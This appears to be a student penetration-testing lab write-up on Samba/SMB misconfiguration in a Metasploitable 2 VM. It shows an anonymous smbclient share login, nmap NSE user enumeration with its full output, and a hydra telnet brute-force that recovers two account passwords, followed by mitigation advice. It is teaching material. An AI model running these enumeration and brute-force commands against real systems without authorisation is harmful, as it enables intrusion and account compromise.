# Lab 3: Samba/SMB Misconfiguration

**Target:** Metasploitable 2 VM
**IP Address:** 192.168.10.100
**Services:** Samba smbd (Ports 139, 445)
**Tools:** smbclient, Nmap (NSE Scripts)

---

## 1. Anonymous Access Check (smbclient)

Shares found: print$, tmp, opt, IPC$, ADMIN$

Gained access to "tmp" using the following command:
smbclient //192.168.10.100/tmp -N

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 25 05:13:45 2025
  ..                                 DR        0  Sun May 20 15:36:12 2012
  5187.jsvc_up                        R        0  Mon Nov 24 15:58:03 2025
  .ICE-unix                          DH        0  Mon Nov 24 15:56:59 2025
  .X11-unix                          DH        0  Mon Nov 24 15:57:29 2025
  .X0-lock                           HR       11  Mon Nov 24 15:57:29 2025

                7282168 blocks of size 1024. 5436404 blocks available
smb: \> exit

---

## 2. Deep Enumeration (Nmap NSE)

Running the following command (sudo nmap -p 139,445 --script smb-enum-users,smb-os-discovery 192.168.10.100), gave me the results below

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 20:18 EST
Nmap scan report for 192.168.10.100
Host is up (0.0017s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:86:8E:CE (VMware)

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-11-25T05:23:59-05:00
| smb-enum-users: 
|   METASPLOITABLE\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\bind (RID: 1210)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\dhcp (RID: 1202)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\distccd (RID: 1222)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\ftp (RID: 1214)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\games (RID: 1010)
|     Full name:   games
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\klog (RID: 1206)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\libuuid (RID: 1200)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\man (RID: 1012)
|     Full name:   man
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   METASPLOITABLE\mysql (RID: 1218)
|     Full name:   MySQL Server,,,
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\news (RID: 1018)
|     Full name:   news
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\postfix (RID: 1212)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\postgres (RID: 1216)
|     Full name:   PostgreSQL administrator,,,
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\proftpd (RID: 1226)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\root (RID: 1000)
|     Full name:   root
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\service (RID: 3004)
|     Full name:   ,,,
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\sshd (RID: 1208)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\syslog (RID: 1204)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\telnetd (RID: 1224)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\tomcat55 (RID: 1220)
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   METASPLOITABLE\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Account disabled, Normal user account

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds

**Analysis:** The `smb-enum-users` script successfully enumerated over 30 valid system accounts, including the active accounts `msfadmin` and `user`. This provided a crucial **username list** for the subsequent credential brute-force attack against other services.

---

## 3. Exploitation and Mitigation

---

After creating a document for known usernames as well as a second document for known passwords I ran the command (hydra -L usernames.txt -P passwords.txt telnet://192.168.10.100) and got the following result

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-26 20:32:27
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 16 tasks per 1 server, overall 16 tasks, 48 login tries (l:8/p:6), ~3 tries per task
[DATA] attacking telnet://192.168.10.100:23/
[23][telnet] host: 192.168.10.100   login: user   password: user
[23][telnet] host: 192.168.10.100   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-26 20:32:35

As you can see above it shows the successful username and password for 2 accounts, user and msfadmin

---

**Mitigation/Remediation**

---

Disable Telnet: Telnet should be entirely disabled and replaced with SSH (Secure Shell), which encrypts traffic and credentials.

Strong Passwords: Implement a strong password policy (complexity, length) to prevent simple dictionary and brute-force attacks.

Account Lockout: Implement an account lockout policy after a small number of failed login attempts to thwart brute-forcing tools like Hydra.

---
